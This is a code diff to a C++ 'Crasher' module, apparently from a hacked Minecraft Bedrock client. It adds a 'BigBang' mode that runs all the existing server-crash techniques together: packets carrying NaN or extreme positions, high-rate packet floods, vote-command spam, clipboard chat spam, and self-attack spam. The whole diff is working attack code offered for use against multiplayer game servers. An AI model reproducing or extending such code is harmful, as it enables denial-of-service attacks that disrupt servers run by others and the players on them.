@@ -13,9 +13,8 @@ public:
 			.addEntry(EnumEntry("PacketStorm", 1))
 		    .addEntry(EnumEntry("VoteSpam", 2))
 		    .addEntry(EnumEntry("ClipboardSpam", 3))
-			.addEntry(EnumEntry("Selfhit", 4));
-	//Someone add selhit
-	//will add mixall
+			.addEntry(EnumEntry("Selfhit", 4))
+			.addEntry(EnumEntry("BigBang", 5));
 	}
 	~Crasher(){};
 
@@ -34,7 +33,7 @@ public:
 				movePacket->Position.z = static_cast<float>(0xFFFFFFFF);
 			}
 		}
-		if (CrasherMode.selected == 1) {
+		if (CrasherMode.selected == 1 || CrasherMode.selected == 5) {
 			if (packet->isInstanceOf<PlayerAuthInputPacket>()) {
 				PlayerAuthInputPacket* InputPacket = reinterpret_cast<PlayerAuthInputPacket*>(packet);
 				InputPacket->pos.x = NAN;
@@ -67,7 +66,7 @@ public:
 		//C_AnimatePacket AnimatePacket;
 		//CommandRequestPacket CommandRequestPacket;
 		//CommandRequestPacket.payload = std::string("FADEAWAY ON TOP");
-		if (CrasherMode.selected == 1) {
+		if (CrasherMode.selected == 1 || CrasherMode.selected == 5) {
 			//g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&ChunkRequestPacket);
 			for (int PacketStorm = 0; PacketStorm < CrasherPPS; PacketStorm++) {
 				gm->player->causeFallDamage(0,0,0);
@@ -78,7 +77,7 @@ public:
 				//g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&CommandRequestPacket);
 			}
 		}
-		if (CrasherMode.selected == 2) {
+		if (CrasherMode.selected == 2 || CrasherMode.selected == 5) {
 			for (int VoteSpam = 0; VoteSpam < CrasherPPS; VoteSpam++) {
 				textPacket.message.setText("./vote");
 				textPacket.messageType = 3;
@@ -87,7 +86,7 @@ public:
 				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&textPacket);
 			}
 		}
-		if (CrasherMode.selected == 3) {
+		if (CrasherMode.selected == 3 || CrasherMode.selected == 5) {
 			for (int ChineseSpam = 0; ChineseSpam < CrasherPPS; ChineseSpam++) {
 				textPacket.message.setText(Utils::getClipboardText());
 				textPacket.sourceName.setText(g_Data.getLocalPlayer()->getNameTag()->getText());
@@ -95,7 +94,7 @@ public:
 				g_Data.getClientInstance()->loopbackPacketSender->sendToServer(&textPacket);
 			}
 		}
-		if (CrasherMode.selected == 4) {
+		if (CrasherMode.selected == 4 || CrasherMode.selected == 5) {
 			gm->player->swing();
 			for (int AttackSpam = 0; AttackSpam < CrasherPPS; AttackSpam++) {
 				g_Data.getCGameMode()->attack(gm->player);
